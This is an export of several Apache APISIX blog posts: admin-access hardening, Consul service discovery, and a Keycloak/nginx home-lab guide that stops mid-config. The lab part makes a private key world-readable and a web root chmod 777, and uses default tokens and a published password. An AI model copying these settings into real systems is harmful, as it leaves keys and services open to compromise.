business-related because rate-limiting is per user. Still, the API Gateway provides the feature out of the box.\\n\\nThen, know your infrastructure components. It\'s impossible to know all the components, but you should have a passing knowledge of the elements available inside your org. If you\'re using a Cloud Provider, get a map of all their proposed services.\\n\\nRegarding the inability to know all the components, talk to your SysAdmins. My experience has shown me that most organizations must utilize their SysAdmins effectively. The latter would like to be more involved in the overall system architecture design but are rarely requested to. Most SysAdmins love to share their knowledge!\\n\\nYou also need to think about configuration. If you need to configure each library component on each instance, that\'s a huge red flag; prefer an infrastructure component. Some libraries offer a centralized configuration solution, _e.g._, [Spring Cloud Config](https://docs.spring.io/spring-cloud-config/). Carefully evaluate the additional complexity of such a component and its failure rate compared to other dedicated infrastructure components.\\n\\nOrganizations influence choice *a lot*. The same problem in two different organizational contexts may result in two opposite solutions. Familiarity with a solution generally trumps other solutions\' better fit.\\n\\nFinally, as I mentioned in the introduction, your experience will influence your choices: former software architects prefer app-centric solutions, and former sys admins infrastructure solutions. One should be careful to limit one\'s bias toward one\'s preferred solution, which might not be the best fit in a different context.\\n\\n## Conclusion\\n\\nIn this post, I\'ve taken the example of per-user rate limiting to show how one can implement it in a library and an infrastructure component. Then, I generalized this example and gave a couple of guidelines. I hope they will help you make better choices regarding where to place a feature in your system.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/resilient-boot).\\n\\n**To go further:**\\n\\n* [Bucket4J](https://github.com/bucket4j/bucket4j)\\n* [Spring Cloud Config](https://docs.spring.io/spring-cloud-config/)\\n* [Apache APISIX rate limiting plugin](https://apisix.apache.org/docs/apisix/plugins/limit-req/)"},{"id":"Securing Admin Access to Apache APISIX","metadata":{"permalink":"/blog/2023/02/09/secure-apisix-admin","source":"@site/blog/2023/02/09/secure-apisix-admin.md","title":"Securing Admin Access to Apache APISIX","description":"API Gateways are critical components in one\'s infrastructure. If an attacker could change the configuration of routes, they could direct traffic to their infrastructure. Consequences could range from data theft to financial losses. Worse, data theft could only be noticed after a long time by mirroring the load. Hence, protecting your API Gateway is of utmost importance","date":"2023-02-09T00:00:00.000Z","formattedDate":"February 9, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.385,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"The right feature at the right place","permalink":"/blog/2023/02/23/right-feature-right-place"},"nextItem":{"title":"How to Integrate API Gateway and Consul? Not Consul K/V","permalink":"/blog/2023/01/18/consul-with-apisix"}},"content":"> API Gateways are critical components in one\'s infrastructure. If an attacker could change the configuration of routes, they could direct traffic to their infrastructure. Consequences could range from data theft to financial losses. Worse, data theft could only be noticed after a long time by mirroring the load. Hence, protecting your API Gateway is of utmost importance.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/secure-apisix-admin/\\" />\\n</head>\\n\\nIn this short blog post, I\'ll list a couple of ways to secure your [Apache APISIX](https://apisix.apache.org/) admin access.\\n\\n## Change admin tokens\\n\\nYou can manage Apache APISIX configuration via its HTTP APIs. A token protects every API call. Operations require an `X-API-KEY` HTTP Header:\\n\\n* Use a token with the _viewer_ role to call read operations\\n* Use a token with the _admin_ role to call read *and* write operations\\n\\nFor example, to create a new route, I need to pass an _admin_-role token, which allows calling write operations:\\n\\n```bash\\ncurl http://localhost:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"methods\\": [\\"GET\\"],\\n  \\"uri\\": [\\"/hello\\"],\\n  \\"upstream_id\\": 1\\n}\'\\n```\\n\\nThe first and foremost step to secure your access is to change the default token values:\\n\\n```yaml\\ndeployment:\\n  admin:\\n    # Default token when use API to call for Admin API.\\n    # *NOTE*: Highly recommended to modify this value to protect APISIX\'s Admin API.\\n    # Disabling this configuration item means that the Admin API does not\\n    # require any authentication.\\n    admin_key:\\n      - name: admin\\n        key: edd1c9f034335f136f87ad84b625c8f1                                    #1\\n        role: admin                 # admin: manage all configuration data\\n                                    # viewer: only can view configuration data\\n      - name: viewer\\n        key: 4054f7cf07e344346cd3f287985e76a2                                    #1\\n        role: viewer\\n```\\n\\n1. Change it!\\n\\nYou may want to secure tokens even further; it depends on your platform. For example, you may want to store tokens as `Secret` and inject them at container startup.\\n\\n## Restrict binding IP(s)\\n\\nA server can have multiple IPs from different network adapters. For example, an API Gateway would have at least two network adapters:\\n\\n* One public-facing adapter to be reachable from the Internet\\n* One internal for inside access\\n\\nBy default, [Apache APISIX](https://github.com/apache/apisix) will bind itself to all network adapters found on the server at startup. The above scenario means it will be reachable **from the Internet**. We should restrict access from the inside only.\\n\\nWe can set which network interface Apache APISIX can bind to in the configuration:\\n\\n```yaml\\ndeployment:\\n  admin:\\n    admin_listen:\\n      ip: 0.0.0.0     # Specific IP, if not set, the default value is `0.0.0.0` #1\\n```\\n\\n1. Change it!\\n\\n## Restrict allowed IPs\\n\\nEven if you restrict access to only IPs from inside your enterprise network, you want only some machines to access the API Gateway configuration. If it was the case, an attacker gaining access to the machine of an accountant could use it to try to attack the API Gateway.\\n\\nYou can restrict IP access with network policies - and you should. However, you can also implement this restriction on the API Gateway: it can allow finer-grained control and more agile changes - network policies are hard to change in general.\\n\\nHere\'s the relevant snippet for Apache APISIX:\\n\\n```yaml\\ndeployment:\\n  admin:\\n    allow_admin:\\n      - 127.0.0.0/24 # If we don\'t set any IP list, then any IP access is allowed by default\\n      #- \\"::/64\\"                                                                #1\\n```\\n\\n1. Change it according to your network topology.\\n\\n## Mutual TLS\\n\\nIf to talk about authentication, one way is via a digital certificate. The most widespread low-level authentication mechanism today is <abbr title=\\"Transport Layer Security\\">TLS</abbr>. TLS allows servers to prove their identity. Additionally, it keeps data exchanged private and prevents them from being tampered with.\\n\\nMutual TLS works on both sides so that the server proves its identity to the client **and** the client proves its identity to the server.\\n\\nHere\'s the relevant configuration snippet to set admin mTLS in Apache APISIX:\\n\\n```yaml\\ndeployment:\\n  admin:\\n    https_admin: true   # enable HTTPS when use a separate port for Admin API\\n                        # Admin API will use conf/apisix_admin_api.crt and conf/apisix_admin_api.key as certificate\\n    admin_api_mtls:\\n      admin_ssl_ca_cert:  \\"/data/certs/mtls_ca.crt\\"       # Path of your self-signed ca cert\\n      admin_ssl_cert:     \\"/data/certs/mtls_server.crt\\"   # Path of your self-signed server side cert\\n      admin_ssl_cert_key: \\"/data/certs/mtls_server.key\\"   # Path of your self-signed server side key\\n```\\n\\n## Standalone mode\\n\\nLast but not least, one can completely move the configuration from `etcd` to a static (YAML) file. In this case, no Admin API is available to update the configuration. This deployment model is known as **standalone mode**.\\n\\nIn standalone mode, the only way to change the configuration is to update the static file: Apache APISIX will check for changes at regular intervals and update itself accordingly. It\'s a great way to apply GitOps principles with Apache APISIX.\\n\\nIn the meanwhile, you can configure standalone mode as the following:\\n\\n```yaml\\ndeployment:\\n    role: data_plane\\n    role_data_plane:\\n       config_provider: yaml\\n```\\n\\nNote that standalone mode makes all other securing options moot, as there\'s no Admin API to secure anymore.\\n\\n## Conclusion\\n\\nYou need to secure API Gateways from unwanted access as they are valuable targets for bad actors. In this post, I\'ve shown several non-exclusive options you should consider to secure Apache APISIX.\\n\\nFinally, I\'ve described how you could make it without the Admin API via the dedicated Standalone deployment mode. Expect a future blog post on how to use it with GitOps.\\n\\n**To go further:**\\n\\n* [mTLS: Protect Admin API](https://apisix.apache.org/docs/apisix/mtls/#protect-admin-api)\\n* [Standalone mode](https://apisix.apache.org/docs/apisix/deployment-modes/#standalone)"},{"id":"How to Integrate API Gateway and Consul? Not Consul K/V","metadata":{"permalink":"/blog/2023/01/18/consul-with-apisix","source":"@site/blog/2023/01/18/consul-with-apisix.md","title":"How to Integrate API Gateway and Consul? Not Consul K/V","description":"Apache APISIX supports the Consul service discovery registry. This article will walk you through the process of implementing service discovery and service registry in APISIX.","date":"2023-01-18T00:00:00.000Z","formattedDate":"January 18, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.455,"truncated":true,"authors":[{"name":"Yihao LI","title":"Author","url":"https://github.com/Fabriceli","image_url":"https://github.com/Fabriceli.png","imageURL":"https://github.com/Fabriceli.png"}],"prevItem":{"title":"Securing Admin Access to Apache APISIX","permalink":"/blog/2023/02/09/secure-apisix-admin"},"nextItem":{"title":"Accessing APISIX-Dashboard from Everywhere with Keycloak Authentication","permalink":"/blog/2023/01/02/accessing_apisix-dashboard_from_everywhere_with_keycloak_authentication"}},"content":"> Apache APISIX supports the Consul service discovery registry. This article will walk you through the process of implementing service discovery and service registry in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\n### About Apache APISIX\\n\\nApache APISIX is an open source, dynamic, scalable, and high-performance cloud native API gateway for all your APIs and microservices.\\n\\nAPISIX facilitates interface traffic handling for websites, mobile and IoT applications by providing services such as load balancing, dynamic upstream, canary release, fine-grained routing, rate limiting, and many more.\\n\\n### About Consul\\n\\nConsul is a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure. Consul provides several key features: Multi-Datacenter, Service Mesh, Service Discovery, Health Checking, Key/Value Storage\\n\\n## Preparation Phase\\n\\nThe test environments in this article are built in Docker using docker-compose.\\n\\n1. Download Apache APISIX\\n\\n  ```sh\\n  git clone https://github.com/apache/apisix-docker.git\\n  ```\\n\\n2. Create and run Consul\\n\\n  ```sh\\n  docker run --rm --name consul_1 -d -p 8500:8500 consul:1.8 consul agent -server -bootstrap-expect=1 -node=agent-one -client 0.0.0.0 -log-level info -data-dir=/consul/data -enable-script-checks\\n   ```\\n\\n3. Update Apache APISIX config file `apisix_conf/config.yaml`\\n\\n  ```yaml\\n  # config.yml\\n  # ... other config\\n  discovery:\\n    consul:\\n      servers:\\n        - \\"http://127.0.0.1:8500\\"\\n  ```\\n\\n4. Start Apache APISIX\\n\\n  ```sh\\n  # cd example folder\uff0cand start APISIX\\n  docker-compose -f docker-compose.yml -p apisix-docker  up -d\\n  ```\\n\\n5. Example contains two web services that you can use directly to test.\\n\\n  ```sh\\n  sudo docker inspect -f=\'{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\' $(sudo docker ps -aq) | grep web\\n  # Outputs\\n  /apisix-docker-web1-1 - 172.21.0.5\\n  /apisix-docker-web2-1 - 172.21.0.6\\n  ```\\n\\n6. Register the test service to Consul via Consul HTTP API.\\n\\n  ```shell\\n  # Register with the corresponding IP and port\\n  curl --location --request PUT \'http://127.0.0.1:8500/v1/agent/service/register\' \\\\\\n    --header \'Content-Type: application/json\' \\\\\\n    --data \'{\\n        \\"ID\\": \\"service_a1\\",\\n        \\"Name\\": \\"service_a\\",\\n       \\"Tags\\": [\\"primary\\", \\"v1\\"],\\n       \\"Address\\": \\"172.21.0.5\\",\\n       \\"Port\\": 9081,\\n       \\"Weights\\": {\\n           \\"Passing\\": 10,\\n           \\"Warning\\": 1\\n       }\\n    }\'\\n\\n  curl --location --request PUT \'http://127.0.0.1:8500/v1/agent/service/register\' \\\\\\n    --header \'Content-Type: application/json\' \\\\\\n    --data \'{\\n      \\"ID\\": \\"service_a2\\",\\n      \\"Name\\": \\"service_a\\",\\n      \\"Tags\\": [\\"primary\\", \\"v1\\"],\\n      \\"Address\\": \\"172.21.0.6\\",\\n      \\"Port\\": 9082,\\n      \\"Weights\\": {\\n        \\"Passing\\": 10,\\n        \\"Warning\\": 1\\n      }\\n   }\'\\n  ```\\n\\n7. Check whether the test service is registered successfully.\\n\\n  ```shell\\n  curl --location --request GET \'http://127.0.0.1:8500/v1/catalog/service/service_a\'\\n  ```\\n\\n   The URL `/v1/catalog/service/:service_name` end with the path parameters which specifies the name of the service.\\n   The following return message indicates successful registration.\\n\\n  ```json\\n   [{\\n     \\"ID\\": \\"7a36c6f1-f701-9c67-8db8-7b8551d36b4a\\",\\n     \\"Node\\": \\"agent-one\\",\\n     \\"Address\\": \\"172.23.0.2\\",\\n     \\"Datacenter\\": \\"dc1\\",\\n     \\"TaggedAddresses\\": {\\n       \\"lan\\": \\"172.23.0.2\\",\\n       \\"lan_ipv4\\": \\"172.23.0.2\\",\\n       \\"wan\\": \\"172.23.0.2\\",\\n       \\"wan_ipv4\\": \\"172.23.0.2\\"\\n     },\\n     \\"NodeMeta\\": {\\n       \\"consul-network-segment\\": \\"\\"\\n     },\\n     \\"ServiceKind\\": \\"\\",\\n     \\"ServiceID\\": \\"service_a1\\",\\n     \\"ServiceName\\": \\"service_a\\",\\n     \\"ServiceTags\\": [\\"primary\\", \\"v1\\"],\\n     \\"ServiceAddress\\": \\"172.20.10.2\\",\\n     \\"ServiceTaggedAddresses\\": {\\n       \\"lan_ipv4\\": {\\n         \\"Address\\": \\"172.20.10.2\\",\\n         \\"Port\\": 9082\\n       },\\n       \\"wan_ipv4\\": {\\n         \\"Address\\": \\"172.20.10.2\\",\\n         \\"Port\\": 9082\\n       }\\n     },\\n     \\"ServiceWeights\\": {\\n       \\"Passing\\": 10,\\n       \\"Warning\\": 1\\n     },\\n     \\"ServiceMeta\\": {},\\n     \\"ServicePort\\": 9082,\\n     \\"ServiceEnableTagOverride\\": false,\\n     \\"ServiceProxy\\": {\\n       \\"MeshGateway\\": {},\\n       \\"Expose\\": {}\\n     },\\n     \\"ServiceConnect\\": {},\\n     \\"CreateIndex\\": 46,\\n     \\"ModifyIndex\\": 124\\n   }, {\\n     \\"ID\\": \\"7a36c6f1-f701-9c67-8db8-7b8551d36b4a\\",\\n     \\"Node\\": \\"agent-one\\",\\n     \\"Address\\": \\"172.23.0.2\\",\\n     \\"Datacenter\\": \\"dc1\\",\\n     \\"TaggedAddresses\\": {\\n       \\"lan\\": \\"172.23.0.2\\",\\n       \\"lan_ipv4\\": \\"172.23.0.2\\",\\n       \\"wan\\": \\"172.23.0.2\\",\\n       \\"wan_ipv4\\": \\"172.23.0.2\\"\\n     },\\n     \\"NodeMeta\\": {\\n       \\"consul-network-segment\\": \\"\\"\\n     },\\n     \\"ServiceKind\\": \\"\\",\\n     \\"ServiceID\\": \\"service_a2\\",\\n     \\"ServiceName\\": \\"service_a\\",\\n     \\"ServiceTags\\": [\\"primary\\", \\"v1\\"],\\n     \\"ServiceAddress\\": \\"172.20.10.2\\",\\n     \\"ServiceTaggedAddresses\\": {\\n       \\"lan_ipv4\\": {\\n         \\"Address\\": \\"172.20.10.2\\",\\n         \\"Port\\": 9081\\n       },\\n       \\"wan_ipv4\\": {\\n         \\"Address\\": \\"172.20.10.2\\",\\n         \\"Port\\": 9081\\n       }\\n     },\\n     \\"ServiceWeights\\": {\\n       \\"Passing\\": 10,\\n       \\"Warning\\": 1\\n     },\\n     \\"ServiceMeta\\": {},\\n     \\"ServicePort\\": 9081,\\n     \\"ServiceEnableTagOverride\\": false,\\n     \\"ServiceProxy\\": {\\n       \\"MeshGateway\\": {},\\n       \\"Expose\\": {}\\n     },\\n     \\"ServiceConnect\\": {},\\n     \\"CreateIndex\\": 47,\\n     \\"ModifyIndex\\": 125\\n   }]\\n  ```\\n\\n## Add a Route\\n\\nThe `X-API-KEY` need to be determined before adding them. `X-API-KEY`: For the Admin API access token, in this example, we use the default `edd1c9f034335f136f87ad84b625c8f1`.\\nHere the request with URL `/consul/web/*` is routed to Consul service `service_a`. Also, the `discovery_type` must be set to `consul` to start the corresponding module.\\nAdd Consul to the route using the Admin API provided by Apache APISIX.\\n\\n```sh\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"uri\\": \\"/consul/web/*\\",\\n    \\"upstream\\": {\\n        \\"service_name\\": \\"service_a\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"discovery_type\\": \\"consul\\"\\n    }\\n}\'\\n```\\n\\nThe following return message indicates successful addition.\\n\\n```json\\n{\\n  \\"value\\": {\\n    \\"status\\": 1,\\n    \\"uri\\": \\"\\\\/*\\",\\n    \\"update_time\\": 1674029322,\\n    \\"id\\": \\"1\\",\\n    \\"upstream\\": {\\n      \\"hash_on\\": \\"vars\\",\\n      \\"discovery_type\\": \\"consul\\",\\n      \\"pass_host\\": \\"pass\\",\\n      \\"scheme\\": \\"http\\",\\n      \\"service_name\\": \\"service_a\\",\\n      \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"create_time\\": 1674029322,\\n    \\"priority\\": 0\\n  },\\n  \\"key\\": \\"\\\\/apisix\\\\/routes\\\\/1\\"\\n}\\n```\\n\\n## Test and Verify the Result\\n\\nThe request results show that the new route in Apache APISIX has been able to find the correct service address through Consul and request it to both nodes based on the load balancing policy.\\n\\n```sh\\n# the first request\\ncurl -s http://127.0.0.1:9080/consul/web/\\n# Output\\nhello web2%\\n\\n# the second request\\ncurl -s http://127.0.0.1:9080/consul/web/\\n# Output\\nhello web1%\\n\\n# Note: It is also possible that both requests will return\\n#       the same result as web1 or web2.\\n#       This is caused by the nature of load balancing and\\n#       you can try to make more requests.\\n```\\n\\n## Summary\\n\\nThe first half of this article describes how Apache APISIX works with Consul to implement the Consul service discovery registry to solve the problem of service information management and maintenance. The second half of this article focuses on how to use Apache APISIX in Docker with Consul. Of course, the application in the actual scenario needs to be analyzed according to the business scenario and the existing system architecture.\\n\\nMore instructions on using the Consul registry in Apache APISIX can be found in the [official documentation](https://apisix.apache.org/docs/apisix/discovery/consul_kv/).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/docs/general/join) to communicate."},{"id":"Accessing APISIX-Dashboard from Everywhere with Keycloak Authentication","metadata":{"permalink":"/blog/2023/01/02/accessing_apisix-dashboard_from_everywhere_with_keycloak_authentication","source":"@site/blog/2023/01/02/accessing_apisix-dashboard_from_everywhere_with_keycloak_authentication.md","title":"Accessing APISIX-Dashboard from Everywhere with Keycloak Authentication","description":"This guest blog shares how to expose the APISIX Dashboard using APISIX to authenticate access with the OpenID-Connect plugin and Keycloak server to manage identities.","date":"2023-01-02T00:00:00.000Z","formattedDate":"January 2, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":17.575,"truncated":true,"authors":[{"name":"Busico Mirto Silvio","title":"Author","url":"https://github.com/MirtoBusico","image_url":"https://avatars.githubusercontent.com/u/11090934?s=400&u=644e4f87c2fad56760f6eb4f46cbcb4db059880a&v=4","imageURL":"https://avatars.githubusercontent.com/u/11090934?s=400&u=644e4f87c2fad56760f6eb4f46cbcb4db059880a&v=4"}],"prevItem":{"title":"How to Integrate API Gateway and Consul? Not Consul K/V","permalink":"/blog/2023/01/18/consul-with-apisix"},"nextItem":{"title":"Release Apache APISIX 3.1.0","permalink":"/blog/2022/12/30/release-apache-apisix-3.1.0"}},"content":"> This article describes how to setup an external access to apisix-dashboard protecting the URL with authentication managed by a keycloak server.\\n\\n\x3c!--truncate--\x3e\\n\\n![framework](https://static.apiseven.com/uploads/2023/01/20/mV2GUS21_blog01a.png)\\n\\nThis article presents how to setup a framework where a user can access the Apisix-dashboard protected using an authentication system managed by a Keycloak server.\\n\\n## Prerequisites\\n\\nBasic understanding of nginx reverse proxy, kubernetes, apisix and openid connect.\\n\\n> A lot of information on this matter can be found in [\\"Use Keycloak with API Gateway to secure APIs\\"](https://apisix.apache.org/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis/) blog post\\n\\nHere I\'ll present instructions, examples, code and screenshots taken from my home lab.\\n\\nThe framework used in this article consists of some KVM virtual machines (from now VM):\\n\\n| VM Name | Role              | Services                    | Description                                        |\\n| ------- | ----------------- | --------------------------- | -------------------------------------------------- |\\n| hdev    | Development       | kubectl, istioctl, helm     | workstation from where manage the cluster          |\\n| hserv   | external services | DNS server, Nginx, Keycloak | services used by the cluster VM and external users |\\n| hkm     | Kubernetes master | master node                 | control plane manager for K8S                      |\\n| hkw1    | K8S worker 1      | first worker node           | node for hosting pods                              |\\n| hkw2    | K8S worker 2      | second worker node          | node for hosting pods                              |\\n| hkw3    | K8S worker 3      | third worker node           | node for hosting pods                              |\\n\\nThe **hserv** VM have two lan cards: one on an external lan to expose services and one an internal lan to communicate with the Kubernetes (from now K8S) cluster.\\nAll the other VM are only connected to the internal lan.\\n\\nAll the machines resolve the IP addresses using the DNS server installed on **hserv**\\n\\n**Hserv** and **hdev** machines have a Graphical User Interface (from now GUI). All the other machines have only the character console.\\n\\n> The real framework is more complex. Here are reported only the relevant components\\n\\nAll machines use Ubuntu distribution but commands reported here should worh for other distributions with some modifications.\\nThe username used throughout this article will be **\\"sysop\\"** So the home directory will be indicated as **\\"/home/sysop\\"** or **\\"~/\\"**.\\n\\n## Create a Certification Authority and Certificates\\n\\nFor all the VM the DNS server will resolve **\\"apisix.h.net\\"** to the external address of **hserv**.\\nIn all others machine that will access the the services exposed by **hserv** there will be a line in the **\\"/etc/hosts\\"** file resolving **\\"apisix.h.net\\"** to the external address of **hserv**.\\n\\n> Working on **hserv**\\n\\nCreate the directory for the entire project software\\n\\n```\\ncd\\nmkdir H\\n```\\n\\nCreate the directory to hold the Certification authority (from now CA) certificates and the web sites certificates\\n\\n```\\ncd ~/H\\nmkdir hservcerts\\ncd hservcerts\\n```\\n\\nCreate a private key for **\\"hservca\\"**\\n\\n```\\nsudo openssl genrsa -out hservca.key 2048\\n```\\n\\nThis generates a **hservca.key** key file. Using this fiile generate the CA certificate\\n\\n```\\nsudo openssl req -x509 -new -nodes -key hservca.key -sha256 -days 3650 -out hservca.pem\\n```\\n\\nThis generates a **hservca.pem\\"** certificate file. These two files will be used to create the web sites certificates\\n\\n### Add the CA to Browsers\\n\\nTo be able to access the web sites with certidicates issued by this private CA, the CA certificate file have to be added to the web browser that will access these sites.\\n\\n> Working on hdev\\n\\nCopy the **\\"hservca.pem\\"** file in any machine that will access these sites.\\n\\n```\\ncd\\ncp ~/H/hservcerts/hservca.pem .\\nrcp hservca.pem mirto@_any_machine_name_://home/_your_username_/\\n```\\n\\nFor **Firefox** browser go to:\\n\\n```\\nPreferences -> Privacy & Security -> Certificates -> View Certificates -> Authorities -> Import\\n```\\n\\nand import **\\"hservca.pem\\"** (remember to flag all options)\\n\\nFor **Chromium** or **Chrome** browsers go to:\\n\\n```\\nSettings -> Advanced -> Privacy and security -> Manage certificates -> Authorities -> Import (flag all options)\\n```\\n\\nand import **\\"hservca.pem\\"** (remember to flag all options)\\n\\n### Add the CA to the Operating System\\n\\n> Working on hdev\\n\\nCopy the \\"hservca.pem\\" file in the \\"/home/sysop\\" directory.\\nCopy this file on any other machine that will use sertificates signed by this CA.\\n\\n```\\ncd\\ncp ~/H/hservcerts/hservca.pem .\\nrcp hservca.pem mirto@_any_machine_name_://home/_your_username_/\\n```\\n\\n> Work on any machine\\n\\nThen on any machine and hserv do the following:\\n\\n```\\ncd\\nsudo mkdir -p /usr/share/ca-certificates/extra\\nsudo cp hservca.pem /usr/share/ca-certificates/extra/hservca.crt\\nsudo dpkg-reconfigure ca-certificates\\n```\\n\\n> **Attention**:\\n>\\n> \u2022 \\"dpkg-reconfigure ca-certificates\\" do not recognize the \\".pem\\" extension. Copy the **\\"hservca.pem\\"** file to **\\"hservca.crt\\"**\\n>\\n> \u2022 select the new certificate in \\"dpkg-reconfigure ca-certificates\\" (extra/hservca.crt is not selected)\\n\\nConfirm that you want to proceed: select \u201cyes\u201d and click \u201cOk\u201d. Select the new \u201chservca.crt\u201d entry and click \u201cOk\u201d\\n\\n![confirm](https://static.apiseven.com/uploads/2023/01/20/uSuVlfv2_2%20ca-certificates.png)\\n\\n## Install nginx-mainline\\n\\nVerify the system is updated\\n\\n```\\nsudo apt update\\nsudo apt full-upgrade\\n```\\n\\nInstall prerequisites\\n\\n```\\nsudo apt install wget gnupg2 ca-certificates lsb-release ubuntu-keyring software-properties-common -y\\n```\\n\\nDownload the Nginx GPG key\\n\\n```\\nwget -O- https://nginx.org/keys/nginx_signing.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/nginx-archive-keyring.gpg\\n```\\n\\nAdd the Nginx mainline apt repository\\n\\n```\\necho deb [arch=amd64,arm64 signed-by=/usr/share/keyrings/nginx-archive-keyring.gpg] http://nginx.org/packages/mainline/ubuntu `lsb_release -cs` nginx | sudo tee /etc/apt/sources.list.d/nginx-mainline.list\\n```\\n\\nPin the Nginx repository\\n\\n```\\necho -e \\"Package: *\\\\nPin: origin nginx.org\\\\nPin: release o=nginx\\\\nPin-Priority: 900\\\\n\\" | sudo tee /etc/apt/preferences.d/99nginx\\n```\\n\\nUpdate apt and install nginx\\n\\n```\\nsudo apt update\\nsudo apt install nginx\\n```\\n\\n## Install Keycloak\\n\\n> Work on **hserv**\\n\\n### Prerequisites\\n\\nInstall jdk\\n\\n```\\nsudo apt install default-jdk\\n```\\n\\nRemove anacron\\n\\n```\\nsudo apt remove anacron\\n```\\n\\nReboot the **hserv** machine\\n\\n### Keycloak Installation\\n\\nGo in base installation directory and get keycloak installation files (verify what is the last release)\\n\\n```\\ncd ~/H/\\nwget https://github.com/keycloak/keycloak/releases/download/20.0.1/keycloak-20.0.1.zip\\n```\\n\\nExtract the files\\n\\n```\\nunzip keycloak-20.0.1.zip\\n```\\n\\nGo to the bin directory and start keycloak in standalone mode\\n\\n```\\ncd ~/H/keycloak-20.0.1/bin/\\n./kc.sh start-dev\\n```\\n\\nVerify that Keycloak is accessible from **hserv** at the URL **\\"http://localhost:8080\\"**\\n\\nCreate the admin user as name **\\"admin\\"** and password **\\"1357Togo\\"**\\n\\n![k6k01](https://static.apiseven.com/uploads/2023/01/20/N8jhfNWf_3%20k6k01.png)\\n\\nGo to the administration console\\n\\n![k6k02](https://static.apiseven.com/uploads/2023/01/20/casYhEXo_4%20k6k02.png)\\n\\nLogin and the \u201cMaster\u201d realm appears. Note the Keycloak version\\n\\n![k6k03](https://static.apiseven.com/uploads/2023/01/20/mReJJEkt_5%20k6k03.png)\\n\\n### Automatic Keycloak Startup\\n\\n> Work on **hserv**\\n\\nCreate in **\u201c/usr/lib/systemd/system\u201d** a file named **\u201ckeycloak.service\u201d** containing\\n\\n```\\n[Unit]\\nDescription=keycloak service\\nAfter=network.service\\n\\n[Service]\\nExecStart=/home/sysop/H/keycloak-20.0.1/bin/kc.sh start-dev >/var/log/keycloak.log 2>&1\\nPIDFile=/var/run/keycloak.pid\\n\\n[Install]\\nWantedBy=multi-user.target\\n```\\n\\nEnable and activate the service\\n\\n```\\nsudo systemctl enable keycloak\\nsudo systemctl start keycloak\\n```\\n\\nReboot hserv and verify Keycloak is accessible at startup\\n\\n### Create site and certificates for \\"https://k6k.h.net\\"\\n\\n> Work on **hserv**\\n>\\n> Note that keycloak will be abbreviated in **k6k**\\n\\nVerify that the keycloak address was added in **\\"/etc/hosts\\"** file on any machine that will access the service and is reported in the DNS server hosted on **hserv**.\\n\\nThe address used is the exsternal address o the **hsrv** machine\\n\\nIn the **\\"/etc/hosts\\"** fle add the line\\n\\n```\\n192.168.100.20 k6k k6k.h.net\\n```\\n\\nIn the DNS server on **hserv** add the k6k entry in the **\u201ch.net\u201d** DNS zone with address **\u201c192.168.100.20\u201d**\\n\\n![dns01](https://static.apiseven.com/uploads/2023/01/20/clouoRER_6%20dns01.png)\\n\\nCreate the certificate for **\\"k6k.h.net\\"**\\n\\nIn **\\"~/H/hservcerts\\"** create a file called **\\"k6kssl.cnf\\"** containing\\n\\n```\\n[req]\\ndefault_bits = 2048\\ndistinguished_name = req_distinguished_name\\nprompt = no\\n\\n[req_distinguished_name]\\nC = IT\\nST = Italy\\nL = Rome\\nO = Busico Mirto\\nOU = Laboratory\\nCN = k6k.h.net\\n\\n[v3_ca]\\nsubjectAltName = @alt_names\\n\\n[alt_names]\\nDNS.1 = k6k\\n# other names\\nDNS.2 = k6k.h.net\\nDNS.3 = k6k.ext.h.net\\nDNS.4 = k6k.int.h.net\\n```\\n\\nCreate the server private key and csr certificate request\\n\\n```\\ncd ~/H/hservcerts\\nsudo openssl req -new -sha256 -nodes -newkey rsa:2048 -keyout k6k.key -out k6k.csr -config k6kssl.cnf\\n```\\n\\nCreate the certificate signed by the **\\"hservca\\"** certification authority\\n\\n```\\nsudo openssl x509 -req -in k6k.csr -CA hservca.pem -CAkey hservca.key -CAcreateserial -out k6k.crt -sha256 -days 3650 -extfile k6kssl.cnf -extensions v3_ca\\n```\\n\\nNow you have the key file **k6k.key** and the certificate file **k6k.cert** to be used in the nginx reverse proxy\\n\\nChange the access rights for k6k.key file to permit nginx access\\n\\n```\\ncd ~/H/hservcerts\\nsudo chmod a+r k6k.key\\n```\\n\\nCreate the root directory for k6k under nginx and create an index.html file in that directory\\n\\n```\\nsudo mkdir /usr/share/nginx/k6k\\nsudo chmod 777 /usr/share/nginx/k6k\\nvi /usr/share/nginx/k6k/index.html\\n```\\n\\nPut in index.html filke the \\"K6K\\" base document\\n\\n```\\n<!DOCTYPE html>\\n<html>\\n<text>\\n\\n<h1>K6K default page</h1>\\n\\n</text>\\n</html>\\n```\\n\\nIn the directory **\u201c/etc/nginx/conf.d\u201d** create the file **\u201ck6k.conf\u201d**\\n\\n```\\ncd /etc/nginx/conf.d\\nsudo vi k6k.conf\\n```\\n\\nThe file contains\\n\\n```\\nserver {\\n\\n    listen 443 ssl http2;\\n    server_name k6k.h.net;\\n    root   /usr/share/nginx/k6k;\\n\\n    access_log  /var/log/nginx/k6k.access.log;\\n    error_log  /var/log/nginx/k6k.error.log;\\n\\n    ssl_certificate     